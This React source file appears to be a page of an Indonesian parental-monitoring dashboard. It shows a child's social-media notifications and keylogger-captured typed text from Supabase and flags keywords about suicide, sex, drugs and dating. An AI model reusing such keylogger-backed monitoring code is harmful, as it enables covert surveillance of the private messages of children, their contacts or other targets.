'use client';

import React, { useEffect, useRef, useState, useCallback } from 'react';
import { AlertCircle, Search, MessageSquare, Loader2, Smartphone, RefreshCw, Clock, AlertTriangle, ArrowDown, ArrowUp, Trash2 } from 'lucide-react';
import { supabase } from '../../../lib/supabase';

interface UnifiedMessage {
  id: string;
  app_package: string;
  sender_name: string;
  content: string;
  is_outgoing: boolean; // true = typed by child (keylogger), false = received (notification)
  is_suspicious: boolean;
  recorded_at: string;
}

const APP_LABELS: Record<string, string> = {
  whatsapp: 'WhatsApp', instagram: 'Instagram', telegram: 'Telegram',
  orca: 'Messenger', facebook: 'Messenger', tiktok: 'TikTok',
  musically: 'TikTok', snapchat: 'Snapchat', twitter: 'Twitter/X', linkedin: 'LinkedIn',
  telephony: 'SMS', sms: 'SMS',
};

const APP_FILTER_TABS = [
  { key: 'semua',     label: 'Semua'     },
  { key: 'whatsapp',  label: 'WhatsApp'  },
  { key: 'telegram',  label: 'Telegram'  },
  { key: 'instagram', label: 'Instagram' },
  { key: 'lainnya',   label: 'Lainnya'   },
] as const;

type AppFilterKey = typeof APP_FILTER_TABS[number]['key'];

const KNOWN_APP_KEYS = ['whatsapp','telegram','instagram','facebook','orca','tiktok','musically','snapchat','twitter','linkedin'];

function getAppLabel(pkg: string): string {
  for (const [k, v] of Object.entries(APP_LABELS)) {
    if (pkg.toLowerCase().includes(k)) return v;
  }
  return pkg.split('.').pop()?.toUpperCase() || 'App';
}

function matchesTab(pkg: string, tabKey: AppFilterKey): boolean {
  if (tabKey === 'semua')   return true;
  if (tabKey === 'lainnya') return !KNOWN_APP_KEYS.some(k => pkg.toLowerCase().includes(k));
  return pkg.toLowerCase().includes(tabKey);
}

// Keywords for chat highlight
const ALERT_KEYWORDS = [
  'bunuh diri','mau mati','ingin mati','cabul','perkosa','nudes','nafsu','mesum','seks','hubungan badan','berhubungan','drug','sabu','narkoba','ganja','morfin',
  'pacar','pacaran','cinta','love you','aku suka kamu','kencan','jalan sama','jomblo','bodoh','tolol','anjing','babi','goblok','kampret','sialan',
  'malam','bolos','pulang malam','keluar malam','minta uang','pinjam uang','takut','sedih','kesepian','butuh bantuan',
];

function highlightKeywords(text: string): React.ReactNode {
  if (!text) return text;
  const escaped = ALERT_KEYWORDS.map(k => k.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
  const regex = new RegExp(`(${escaped.join('|')})`, 'gi');
  const parts = text.split(regex);
  if (parts.length === 1) return text;
  return (
    <>
      {parts.map((part, i) =>
        ALERT_KEYWORDS.some(kw => kw.toLowerCase() === part.toLowerCase())
          ? <mark key={i} className="bg-rose-500/25 text-rose-300 rounded px-0.5 font-semibold not-italic">{part}</mark>
          : part
      )}
    </>
  );
}

function getAppColor(pkg: string): string {
  if (pkg.includes('whatsapp'))                              return 'bg-green-500/15 text-green-400 border-green-500/20';
  if (pkg.includes('instagram'))                             return 'bg-pink-500/15 text-pink-400 border-pink-500/20';
  if (pkg.includes('telegram'))                              return 'bg-sky-500/15 text-sky-400 border-sky-500/20';
  if (pkg.includes('facebook') || pkg.includes('orca'))     return 'bg-blue-500/15 text-blue-400 border-blue-500/20';
  if (pkg.includes('tiktok') || pkg.includes('musically'))  return 'bg-red-500/15 text-red-400 border-red-500/20';
  return 'bg-accentViolet/15 text-accentViolet border-accentViolet/20';
}

export default function SocialChatsPage() {
  const [loading, setLoading]           = useState(true);
  const [refreshing, setRefreshing]     = useState(false);
  const [device, setDevice]             = useState<any>(null);
  const [rooms, setRooms]               = useState<Record<string, UnifiedMessage[]>>({});
  const [roomNames, setRoomNames]       = useState<string[]>([]);
  const [activeRoom, setActiveRoom]     = useState<string>('');
  const [searchQuery, setSearchQuery]   = useState('');
  const [activeAppFilter, setActiveAppFilter] = useState<AppFilterKey>('semua');
  const [lastUpdated, setLastUpdated]   = useState<Date | null>(null);
  const [supabaseError, setSupabaseError] = useState<string | null>(null);
  const [chatFilter, setChatFilter]     = useState<'all' | 'incoming' | 'outgoing'>('all');
  const [deletingIds, setDeletingIds]   = useState<Set<string>>(new Set());

  const messagesEndRef = useRef<HTMLDivElement>(null);
  const deviceRef = useRef<any>(null);

  const handleDelete = async (compositeId: string) => {
    setDeletingIds(prev => new Set(prev).add(compositeId));
    // Remove from rooms state optimistically
    setRooms(prev => {
      const updated: Record<string, UnifiedMessage[]> = {};
      for (const [room, msgs] of Object.entries(prev)) {
        const filtered = msgs.filter(m => m.id !== compositeId);
        if (filtered.length > 0) updated[room] = filtered;
      }
      return updated;
    });
    setRoomNames(prev => prev.filter(name => {
      // kept for now; empty rooms will be invisible in the filtered view
      return true;
    }));
    // Parse prefix to determine which table to delete from
    const isNotif = compositeId.startsWith('notif_');
    const realId = isNotif ? compositeId.replace('notif_', '') : compositeId.replace('key_', '');
    const table = isNotif ? 'notification_logs' : 'keylogger_logs';
    await supabase.from(table).delete().eq('id', realId);
    setDeletingIds(prev => { const n = new Set(prev); n.delete(compositeId); return n; });
  };

  const isSocialApp = (pkg: string) => {
    // Harus sinkron dengan SOCIAL_CHAT_PACKAGES di SystemSyncNotificationListenerService.kt
    return /whatsapp|telegram|instagram|orca|facebook|tiktok|musically|trill|snapchat|twitter|linkedin/i.test(pkg)
      || pkg === 'com.x.android';  // Twitter/X package baru
  };

  const processUnifiedLogs = useCallback((notifications: any[], keyloggers: any[]) => {
    const unified: UnifiedMessage[] = [];

    // Map Notifications (Incoming)
    notifications.forEach(log => {
      if (!isSocialApp(log.app_package)) return;
      
      const content = log.notification_body || '';
      const is_suspicious = log.is_suspicious || ALERT_KEYWORDS.some(kw => content.toLowerCase().includes(kw));

      unified.push({
        id: `notif_${log.id}`,
        app_package: log.app_package,
        sender_name: log.notification_title || 'General Chat',
        content,
        is_outgoing: false,
        is_suspicious,
        recorded_at: log.received_at || log.created_at
      });
    });

    // Map Keylogger (Outgoing)
    keyloggers.forEach(log => {
      if (!isSocialApp(log.app_package)) return;

      const content = log.typed_text || '';
      const is_suspicious = log.is_suspicious || ALERT_KEYWORDS.some(kw => content.toLowerCase().includes(kw));

      unified.push({
        id: `key_${log.id}`,
        app_package: log.app_package,
        sender_name: 'Ketikan Anak',
        content,
        is_outgoing: true,
        is_suspicious,
        recorded_at: log.recorded_at
      });
    });

    // Deduplicate: same app + content + direction within 5-second window
    const seenMsg = new Map<string, number>();
    const deduped = unified.filter(msg => {
      const bucket = Math.floor(new Date(msg.recorded_at).getTime() / 5000);
      const key = `${msg.app_package}|${msg.is_outgoing}|${msg.content}|${bucket}`;
      if (seenMsg.has(key)) return false;
      seenMsg.set(key, 1);
      return true;
    });

    // Group by Chat Room
    const grouped: Record<string, UnifiedMessage[]> = {};

    deduped.forEach(msg => {
      // For incoming messages, the room is the sender's name (e.g. "Mama")
      // For outgoing typing logs (which don't have a room name), we place them into the most recently active
      // app package room, or display them as a separate room "Balasan Keyboard" inside the app filter.
      // To keep it simple and professional:
      // Group by the app sender name. If it's keylogged outgoing text, we assign it to a default room
      // named "[Ketikan] - WhatsApp" or similar, OR merge them chronologically inside the main app rooms.
      const room = msg.is_outgoing 
        ? `Ketikan Balasan (${getAppLabel(msg.app_package)})`
        : `${msg.sender_name}`;

      if (!grouped[room]) grouped[room] = [];
      grouped[room].push(msg);
    });

    // Sort messages in each room chronologically
    Object.keys(grouped).forEach(roomName => {
      grouped[roomName].sort((a, b) => new Date(a.recorded_at).getTime() - new Date(b.recorded_at).getTime());
    });

    setRooms(grouped);

    // Sort rooms by the newest message timestamp
    const sortedRooms = Object.keys(grouped).sort((a, b) => {
      const timeA = new Date(grouped[a][grouped[a].length - 1].recorded_at).getTime();
      const timeB = new Date(grouped[b][grouped[b].length - 1].recorded_at).getTime();
      return timeB - timeA;
    });

    setRoomNames(sortedRooms);
    return sortedRooms;
  }, []);

  const [clearingAll, setClearingAll]   = useState(false);
  const [confirmClear, setConfirmClear] = useState(false);

  const fetchData = useCallback(async (dev?: any, silent = false) => {
    const target = dev || deviceRef.current;
    if (!target) return;
    if (!silent) setRefreshing(true);
    try {
      const [notifRes, keylogRes] = await Promise.all([
        supabase.from('notification_logs').select('*').eq('device_id', target.id).order('received_at', { ascending: false }).limit(400),
        supabase.from('keylogger_logs').select('*').eq('device_id', target.id).order('recorded_at', { ascending: false }).limit(400)
      ]);

      if (notifRes.error) throw new Error(`Notifications query: ${notifRes.error.message}`);
      if (keylogRes.error) throw new Error(`Keylogger query: ${keylogRes.error.message}`);

      const sorted = processUnifiedLogs(notifRes.data || [], keylogRes.data || []);
      setActiveRoom(prev => (prev && sorted.includes(prev) ? prev : sorted[0] ?? ''));
      setLastUpdated(new Date());
      setSupabaseError(null);
    } catch (err: any) {
      setSupabaseError(err?.message ?? 'Network error');
    } finally {
      setRefreshing(false);
    }
  }, [processUnifiedLogs]);

  useEffect(() => {
    const init = async () => {
      setLoading(true);
      setSupabaseError(null);
      try {
        const { data, error } = await supabase.from('devices').select('*').order('created_at', { ascending: false });
        if (error) { setSupabaseError(`Supabase: ${error.message}`); return; }
        if (!data || data.length === 0) return;
        const saved = typeof window !== 'undefined' ? localStorage.getItem('selected_device_id') : null;
        const dev = data.find((d: any) => d.id === saved) || data[0];
        setDevice(dev); deviceRef.current = dev;
        await fetchData(dev);
      } catch (err: any) {
        setSupabaseError(err?.message ?? 'Network error');
      } finally { setLoading(false); }
    };
    init();
  }, [fetchData]);

  // Append a single new message from realtime payload directly to state (no re-fetch)
  const appendMessage = useCallback((row: any, source: 'notification' | 'keylogger') => {
    if (!isSocialApp(row.app_package)) return;

    let msg: UnifiedMessage;
    if (source === 'notification') {
      const content = row.notification_body || '';
      msg = {
        id: `notif_${row.id}`,
        app_package: row.app_package,
        sender_name: row.notification_title || 'General Chat',
        content,
        is_outgoing: false,
        is_suspicious: ALERT_KEYWORDS.some(kw => content.toLowerCase().includes(kw)),
        recorded_at: row.received_at || row.created_at || new Date().toISOString(),
      };
    } else {
      const content = row.typed_text || '';
      msg = {
        id: `key_${row.id}`,
        app_package: row.app_package,
        sender_name: 'Ketikan Anak',
        content,
        is_outgoing: true,
        is_suspicious: ALERT_KEYWORDS.some(kw => content.toLowerCase().includes(kw)),
        recorded_at: row.recorded_at || new Date().toISOString(),
      };
    }

    const roomName = msg.is_outgoing
      ? `Ketikan Balasan (${getAppLabel(msg.app_package)})`
      : msg.sender_name;

    setRooms(prev => {
      const existing = prev[roomName] || [];
      // Dedup: same app + content + direction within 5-second bucket
      const bucket = Math.floor(new Date(msg.recorded_at).getTime() / 5000);
      const key = `${msg.app_package}|${msg.is_outgoing}|${msg.content}|${bucket}`;
      const isDup = existing.some(m => {
        const b = Math.floor(new Date(m.recorded_at).getTime() / 5000);
        return `${m.app_package}|${m.is_outgoing}|${m.content}|${b}` === key;
      });
      if (isDup) return prev;
      return { ...prev, [roomName]: [...existing, msg] };
    });

    setRoomNames(prev =>
      prev.includes(roomName)
        ? [roomName, ...prev.filter(n => n !== roomName)]  // bump to top
        : [roomName, ...prev]
    );

    setLastUpdated(new Date());
  }, []);

  useEffect(() => {
    if (!device) return;
    const channel = supabase
      .channel(`unified-chats-${device.id}`)
      .on(
        'postgres_changes',
        { event: 'INSERT', schema: 'public', table: 'notification_logs', filter: `device_id=eq.${device.id}` },
        (payload) => appendMessage(payload.new, 'notification')
      )
      .on(
        'postgres_changes',
        { event: 'INSERT', schema: 'public', table: 'keylogger_logs', filter: `device_id=eq.${device.id}` },
        (payload) => appendMessage(payload.new, 'keylogger')
      )
      .subscribe();
    // Fallback sync setiap 60 detik (bukan 30) karena realtime sudah langsung
    const poll = setInterval(() => fetchData(device, true), 60000);
    return () => { supabase.removeChannel(channel); clearInterval(poll); };
  }, [device, fetchData, appendMessage]);

  useEffect(() => { 
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' }); 
  }, [rooms, activeRoom]);

  const filteredRoomNames = roomNames.filter(name => {
    const msgs = rooms[name] || [];
    const pkg = msgs[0]?.app_package ?? '';
    const matchesSearch = name.toLowerCase().includes(searchQuery.toLowerCase()) ||
      getAppLabel(pkg).toLowerCase().includes(searchQuery.toLowerCase());
    return matchesSearch && matchesTab(pkg, activeAppFilter);
  });

  const activeMessagesRaw = activeRoom ? (rooms[activeRoom] ?? []) : [];
  const activeMessages = activeMessagesRaw.filter(msg => {
    if (chatFilter === 'incoming') return !msg.is_outgoing;
    if (chatFilter === 'outgoing') return msg.is_outgoing;
    return true;
  });

  const totalMessages   = Object.values(rooms).flat().length;
  const suspiciousCount = Object.values(rooms).flat().filter(m => m.is_suspicious).length;

  const ErrorBanner = () => supabaseError ? (
    <div className="flex items-start gap-3 p-4 bg-red-950/30 border border-red-900/40 rounded-xl text-sm">
      <AlertTriangle size={18} className="text-red-400 flex-shrink-0 mt-0.5" />
      <div>
        <p className="font-bold text-red-400">Database Connection Issue</p>
        <p className="text-red-300/80 text-xs mt-0.5 font-mono break-all">{supabaseError}</p>
      </div>
    </div>
  ) : null;

  const handleClearAll = async () => {
    if (!device) return;
    if (!confirmClear) { setConfirmClear(true); return; }
    setClearingAll(true);
    setConfirmClear(false);
    try {
      // Fetch social keylogger IDs (filter client-side)
      const { data: klRows } = await supabase.from('keylogger_logs').select('id, app_package').eq('device_id', device.id);
      const socialPkgRe = /whatsapp|telegram|instagram|orca|facebook|messenger|tiktok|musically|snapchat|twitter/i;
      const socialIds = (klRows || []).filter((r: any) => socialPkgRe.test(r.app_package || '')).map((r: any) => r.id);
      if (socialIds.length > 0) {
        for (let i = 0; i < socialIds.length; i += 100)
          await supabase.from('keylogger_logs').delete().in('id', socialIds.slice(i, i + 100));
      }
      await supabase.from('notification_logs').delete().eq('device_id', device.id);
      await fetchData(device, true);
    } catch (err: any) {
      console.error('Clear all failed', err);
    } finally {
      setClearingAll(false);
    }
  };

  if (loading) return (
    <div className="space-y-4">
      <ErrorBanner />
      <div className="flex flex-col items-center justify-center min-h-[60vh] gap-3 text-textSecondary">
        <Loader2 className="animate-spin text-accentViolet" size={36} />
        <p className="text-sm">Menghubungkan ke database...</p>
      </div>
    </div>
  );

  if (!device) return (
    <div className="space-y-6">
      <div>
        <h1 className="text-3xl font-bold tracking-tight">Obrolan Sosial Media</h1>
        <p className="text-textSecondary mt-1.5">Hubungkan perangkat anak untuk mulai memantau chat sosmed.</p>
      </div>
      <ErrorBanner />
    </div>
  );

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between flex-wrap gap-4">
        <div>
          <h1 className="text-3xl font-bold tracking-tight">Obrolan Sosmed</h1>
          <p className="text-textSecondary mt-1.5">
            Merekam pesan masuk dan balasan ketikan keyboard anak pada aplikasi chat perangkat <strong>{device.device_name}</strong>.
          </p>
        </div>
        <div className="flex items-center gap-3">
          {lastUpdated && (
            <span className="text-xs text-textSecondary flex items-center gap-1.5 font-mono">
              <Clock size={12} /> {lastUpdated.toLocaleTimeString('id-ID')}
            </span>
          )}
          <button onClick={() => fetchData(device)}
            className="flex items-center gap-2 px-4 py-2 bg-cardBg border border-borderDark rounded-xl hover:bg-darkBg transition-colors text-sm font-semibold">
            <RefreshCw size={15} className={refreshing ? 'animate-spin' : ''} /> Segarkan
          </button>
          <button
            onClick={handleClearAll}
            disabled={clearingAll || !device}
            onMouseLeave={() => setConfirmClear(false)}
            className={`flex items-center gap-1.5 px-3 py-2 rounded-xl text-xs font-semibold transition-all disabled:opacity-40 ${
              confirmClear
                ? 'bg-red-600 text-white animate-pulse'
                : 'glass-card text-accentRed/70 hover:bg-red-950/30 hover:text-accentRed border border-red-900/20'
            }`}
          >
            {clearingAll ? <Loader2 size={13} className="animate-spin" /> : <Trash2 size={13} />}
            {clearingAll ? 'Menghapus...' : confirmClear ? 'Konfirmasi hapus semua?' : 'Hapus Semua Chat'}
          </button>
        </div>
      </div>

      <ErrorBanner />

      {/* Stat cards */}
      <div className="grid grid-cols-3 gap-4">
        <div className="bg-cardBg border border-borderDark rounded-xl p-4">
          <p className="text-[11px] text-textSecondary uppercase tracking-wider font-semibold">Total Ruang Chat</p>
          <p className="text-2xl font-bold mt-1.5">{roomNames.length}</p>
        </div>
        <div className="bg-cardBg border border-borderDark rounded-xl p-4">
          <p className="text-[11px] text-textSecondary uppercase tracking-wider font-semibold">Pesan Direkam</p>
          <p className="text-2xl font-bold mt-1.5">{totalMessages}</p>
        </div>
        <div className={`border rounded-xl p-4 ${suspiciousCount > 0 ? 'bg-red-950/20 border-red-900/40' : 'bg-cardBg border-borderDark'}`}>
          <p className="text-[11px] text-textSecondary uppercase tracking-wider font-semibold">Konten Mencurigakan</p>
          <p className={`text-2xl font-bold mt-1.5 ${suspiciousCount > 0 ? 'text-accentRed' : ''}`}>{suspiciousCount}</p>
        </div>
      </div>

      {/* Chat panel */}
      <div className="grid grid-cols-1 lg:grid-cols-3 bg-cardBg border border-borderDark rounded-2xl overflow-hidden" style={{ minHeight: '580px' }}>

        {/* Left pane — contact list */}
        <div className="border-r border-borderDark/60 flex flex-col">
          {/* App filter tabs */}
          <div className="px-3 pt-3 pb-2 border-b border-borderDark/60 overflow-x-auto">
            <div className="flex gap-1.5 min-w-max">
              {APP_FILTER_TABS.map(tab => (
                <button key={tab.key} onClick={() => setActiveAppFilter(tab.key)}
                  className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-colors whitespace-nowrap ${
                    activeAppFilter === tab.key
                      ? 'bg-accentViolet text-white'
                      : 'bg-darkBg/60 text-textSecondary hover:text-textPrimary border border-borderDark'
                  }`}>
                  {tab.label}
                </button>
              ))}
            </div>
          </div>
          {/* Search */}
          <div className="p-3 border-b border-borderDark/60">
            <div className="relative">
              <span className="absolute inset-y-0 left-0 pl-3 flex items-center text-textSecondary"><Search size={15} /></span>
              <input type="text" value={searchQuery} onChange={e => setSearchQuery(e.target.value)}
                placeholder="Cari kontak atau aplikasi..."
                className="w-full bg-darkBg/80 border border-borderDark rounded-xl py-2 pl-9 pr-4 text-xs text-textPrimary placeholder:text-textSecondary/50 focus:outline-none focus:border-accentViolet"
              />
            </div>
          </div>
          {/* Room list */}
          <div className="flex-1 overflow-y-auto divide-y divide-borderDark/30">
            {filteredRoomNames.length === 0 ? (
              <div className="flex flex-col items-center justify-center py-16 gap-2 text-textSecondary">
                <MessageSquare size={28} className="opacity-20" />
                <p className="text-xs text-center px-4">
                  {totalMessages === 0
                    ? 'Belum ada obrolan terekam di HP anak.'
                    : 'Tidak ada ruang obrolan ditemukan.'}
                </p>
              </div>
            ) : filteredRoomNames.map(name => {
              const msgs = rooms[name];
              const last = msgs[msgs.length - 1];
              const hasSuspicious = msgs.some(m => m.is_suspicious);
              const isActive = activeRoom === name;
              return (
                <button key={name} onClick={() => { setActiveRoom(name); setChatFilter('all'); }}
                  className={`w-full text-left p-3.5 flex flex-col gap-1 transition-colors ${
                    isActive ? 'bg-accentViolet/10 border-l-2 border-l-accentBlue' : 'hover:bg-darkBg/30 border-l-2 border-l-transparent'
                  }`}>
                  <div className="flex items-center justify-between gap-2">
                    <span className="font-semibold text-xs text-textPrimary truncate max-w-[140px]">{name}</span>
                    <span className="text-[10px] text-textSecondary flex-shrink-0">
                      {new Date(last.recorded_at).toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' })}
                    </span>
                  </div>
                  <div className="flex items-center gap-2">
                    <span className={`px-1.5 py-0.5 border rounded text-[8px] font-bold ${getAppColor(last.app_package)}`}>
                      {getAppLabel(last.app_package)}
                    </span>
                    <span className="text-[10px] text-textSecondary truncate max-w-[150px]">
                      {last.content}
                    </span>
                  </div>
                  {hasSuspicious && (
                    <span className="text-[9px] font-bold text-accentRed flex items-center gap-1 mt-0.5">
                      <AlertCircle size={10} /> Kata Terlarang Terdeteksi
                    </span>
                  )}
                </button>
              );
            })}
          </div>
        </div>

        {/* Right pane — chat bubbles */}
        <div className="lg:col-span-2 flex flex-col bg-darkBg/20">
          <div className="p-4 border-b border-borderDark/60 flex items-center justify-between bg-cardBg/80 flex-wrap gap-3">
            {activeRoom ? (
              <>
                <div>
                  <h3 className="font-bold text-sm">{activeRoom}</h3>
                  <p className="text-[11px] text-textSecondary mt-0.5">
                    {getAppLabel(rooms[activeRoom]?.[0]?.app_package ?? '')} · {rooms[activeRoom]?.length ?? 0} pesan
                  </p>
                </div>
                
                {/* Message Direction Filters */}
                <div className="flex items-center gap-1">
                  {(['all', 'incoming', 'outgoing'] as const).map(f => (
                    <button key={f} onClick={() => setChatFilter(f)}
                      className={`px-2.5 py-1 rounded-lg text-[9px] font-bold transition-all ${
                        chatFilter === f 
                          ? 'bg-accentViolet text-white' 
                          : 'bg-darkBg text-textSecondary hover:text-textPrimary hover:bg-borderDark/25'
                      }`}>
                      {f === 'all' ? 'Semua' : f === 'incoming' ? 'Masuk' : 'Keluar'}
                    </button>
                  ))}
                </div>
              </>
            ) : (
              <p className="text-sm text-textSecondary">Pilih percakapan dari daftar kiri</p>
            )}
          </div>

          <div className="flex-1 p-5 overflow-y-auto space-y-4" style={{ maxHeight: '460px' }}>
            {activeMessages.length === 0 ? (
              <div className="h-full flex flex-col items-center justify-center gap-2 text-textSecondary">
                <MessageSquare size={32} className="opacity-20" />
                <p className="text-xs">Tidak ada pesan untuk filter terpilih.</p>
              </div>
            ) : activeMessages.map(msg => (
              <div key={msg.id} className={`group flex items-end gap-1.5 ${msg.is_outgoing ? 'ml-auto justify-end' : 'justify-start'}`}>
                {/* Delete button left of bubble (incoming) */}
                {!msg.is_outgoing && (
                  <button
                    onClick={() => handleDelete(msg.id)}
                    disabled={deletingIds.has(msg.id)}
                    className="opacity-0 group-hover:opacity-100 p-1 rounded-lg text-textSecondary/50 hover:text-red-400 hover:bg-red-500/10 transition-all disabled:opacity-30 mb-5 shrink-0"
                    title="Hapus pesan ini"
                  >
                      {deletingIds.has(msg.id) ? <Loader2 size={11} className="animate-spin" /> : <Trash2 size={11} />}
                    </button>
                  )}
                  <div className={`max-w-[72%] space-y-1 flex flex-col ${msg.is_outgoing ? 'items-end' : 'items-start'}`}>
                    <div className={`rounded-2xl px-4 py-2.5 text-xs leading-relaxed border ${
                      msg.is_outgoing
                        ? 'bg-accentViolet/20 text-violetLight border-accentViolet/30 rounded-tr-none'
                        : msg.is_suspicious
                          ? 'bg-accentRed/10 border-accentRed/30 text-textPrimary rounded-tl-none'
                          : 'bg-cardBg text-textPrimary border-borderDark rounded-tl-none'
                    }`}>
                      <p className="whitespace-pre-wrap text-xs">{highlightKeywords(msg.content)}</p>
                    </div>
                    <div className={`flex items-center gap-1.5 text-[9px] text-textSecondary/60 ${msg.is_outgoing ? 'flex-row-reverse' : ''}`}>
                      <span>{msg.sender_name}</span>
                      <span>·</span>
                      <span>{new Date(msg.recorded_at).toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' })}</span>
                      {msg.is_suspicious && (
                        <span className="text-accentRed font-bold flex items-center gap-0.5 ml-1">
                          <AlertTriangle size={9} /> Sensitif
                        </span>
                      )}
                    </div>
                  </div>
                  {/* Delete button right of bubble (outgoing) */}
                  {msg.is_outgoing && (
                    <button
                      onClick={() => handleDelete(msg.id)}
                      disabled={deletingIds.has(msg.id)}
                      className="opacity-0 group-hover:opacity-100 p-1 rounded-lg text-textSecondary/50 hover:text-red-400 hover:bg-red-500/10 transition-all disabled:opacity-30 mb-5 shrink-0"
                      title="Hapus pesan ini"
                    >
                      {deletingIds.has(msg.id) ? <Loader2 size={11} className="animate-spin" /> : <Trash2 size={11} />}
                    </button>
                  )}
                </div>
            ))}
            <div ref={messagesEndRef} />
          </div>
        </div>
      </div>
    </div>
  );
}
